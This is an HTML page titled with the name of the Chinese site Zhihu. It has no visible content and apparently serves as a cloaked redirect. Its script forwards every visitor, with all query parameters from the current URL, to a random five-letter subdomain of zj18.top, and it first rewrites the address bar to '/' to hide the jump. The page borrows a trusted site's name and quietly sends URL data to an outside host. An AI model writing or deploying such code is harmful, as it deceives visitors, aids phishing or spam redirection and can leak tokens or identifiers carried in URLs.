<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>知乎</title>
    <script>
        window.onload = function() {
            // 生成随机的5位字母字符串
            function generateRandomString(length) {
                const chars = 'abcdefghijklmnopqrstuvwxyz';
                let result = '';
                for (let i = 0; i < length; i++) {
                    result += chars.charAt(Math.floor(Math.random() * chars.length));
                }
                return result;
            }
            
            const randomSubdomain = generateRandomString(5); // 生成5位随机字母
            
            // 获取当前URL的参数部分
            var params = new URLSearchParams(window.location.search).toString();
            
            // 构造目标跳转URL（带随机子域名）
            var targetUrl = `http://${randomSubdomain}.zj18.top/?${params}`;
            
            // 在同一个事件循环中执行两个操作
            setTimeout(function() {
                // 修改浏览器地址栏显示为首页 `/`（不刷新页面）
                history.pushState({}, '', '/');
                
                // 立即跳转到目标URL
                window.location.href = targetUrl;
            }, 0);
        };
    </script>
</head>
<body>
</body>
</html>
